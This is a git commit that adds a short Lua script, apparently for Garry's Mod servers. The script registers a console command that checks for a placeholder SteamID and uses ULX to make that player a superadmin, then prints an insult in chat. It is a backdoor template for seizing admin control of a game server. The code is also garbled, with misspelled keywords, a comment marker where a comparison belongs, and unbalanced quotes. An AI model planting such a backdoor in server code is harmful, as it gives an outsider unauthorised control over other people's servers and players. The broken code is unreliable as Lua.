c94e0264bf42abb3d0dc619a8e9a20960e8d67e3
#H0ckker# <52911945+PaziloiHacker32@users.noreply.github.com>
2019-07-17 22:34:40 +0500

    Add files via upload

---
+++ gmdbc.lua
@@ -0,0 +1,6 @@
+concommand.Add( "Своя Комманда", function(ply)
+lf (ply:SteamID() -- "свой steamid") then
+RunConsoleCommand("ulx", "adduser", plySteamID(свой SteamID), "superadmin")
+ply:chatPrint("fuck you .. plyname() .. "."
+end
+end))
